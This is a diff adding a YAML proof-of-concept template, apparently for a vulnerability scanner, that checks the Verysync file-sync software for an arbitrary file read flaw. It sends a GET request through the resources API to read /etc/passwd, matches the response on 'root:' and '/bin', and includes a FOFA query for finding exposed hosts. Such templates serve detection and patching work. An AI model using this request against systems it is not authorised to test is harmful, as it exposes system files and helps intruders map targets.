@@ -1,0 +1,16 @@
+id: poc-yaml-verysync-resources-anyfile-read
+info:
+  name: 微力同步Verysync resources 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 微力同步
+  fofa: app="微力同步-Verysync"
+requests:
+- method: GET
+  path: /rest/f/api/resources/f96956469e7be39d/etc/passwd?override=false
+  expression: status_code == 200 && contains(body,"\"path\":") && contains(body,"root:")
+    && contains(body,"/bin") && !contains(body,"<") && contains(headers,"Verysync")
+    && contains(content_type,"application/json")
+variables: {}
+transport: http
